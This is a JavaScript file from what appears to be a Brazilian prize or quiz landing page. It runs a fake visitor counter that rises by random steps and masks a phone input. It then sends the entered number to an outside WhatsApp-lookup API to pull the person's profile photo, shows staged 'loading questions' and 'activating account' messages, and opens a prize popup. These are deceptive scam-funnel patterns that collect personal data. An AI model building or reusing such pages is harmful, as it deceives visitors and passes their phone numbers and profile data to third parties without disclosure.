let current = 1880;
const max = 2103;
const contadorEl = document.getElementById('contador');

const interval = setInterval(() => {
  const incremento = Math.floor(Math.random() * 11); // de 0 a 10
  current += incremento;

  if (current >= max) {
    current = max;
    clearInterval(interval);
  }

  contadorEl.textContent = current;
}, 2000);

let rawPhoneNumber = '';

document.getElementById('celInput').addEventListener('input', e => {
  const onlyDigits = e.target.value.replace(/\D/g, '');
  rawPhoneNumber = onlyDigits;

  e.target.value = onlyDigits
    .replace(/(\d{2})(\d)/, '($1) $2')
    .replace(/(\d{5})(\d)/, '$1-$2')
    .slice(0, 15);
});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


 function saveCel() {
  const botaoComecar = document.getElementById('botaoComecar')
  const popup = document.getElementById('popupPremio')
  const url = `https://wpp-api.eujuan.com/v1/profile/55${rawPhoneNumber}`;
  const errorText = document.getElementById('error-text')

  if (rawPhoneNumber.length < 11) {
    errorText.classList.remove('hidden')
  } else {
    fetch(url)
      .then(response => {
        return response.json();
      })
      .then(async data =>  {
        errorText.classList.add('hidden')
        localStorage.setItem('whatsappPhotoURL', data.link);
        botaoComecar.textContent = "Carregando Perguntas..."
        await sleep(1500)
        botaoComecar.textContent = "Ativando Conta..."
        await sleep(1000)
        popup.classList.remove('hidden')
        await sleep(2000)
        window.location.href = '/av/index.html'
      })

  }
}
